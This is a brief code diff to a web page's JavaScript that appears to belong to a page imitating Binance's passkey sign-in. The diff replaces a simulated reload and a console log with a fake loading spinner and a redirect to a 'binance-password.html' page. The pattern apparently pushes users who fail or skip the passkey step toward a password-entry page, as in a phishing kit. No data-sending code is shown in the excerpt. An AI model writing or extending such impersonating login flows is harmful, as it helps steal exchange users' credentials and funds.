@@ -524,16 +524,19 @@
         document.getElementById('action-btn').addEventListener('click', function() {
             if (currentState === 'failed') {
                 showLoading(this);
-                // Simulate verification attempt
+                // Navigate to password page
                 setTimeout(() => {
-                    location.reload();
-                }, 2000);
+                    window.location.href = 'binance-password.html';
+                }, 1200);
             }
         });
 
         document.querySelector('.passkeys-not-available').addEventListener('click', function(e) {
             e.preventDefault();
-            console.log('Passkeys not available clicked');
+            showLoading(document.getElementById('action-btn'));
+            setTimeout(() => {
+                window.location.href = 'binance-password.html';
+            }, 1200);
         });
 
         function showLoading(button) {
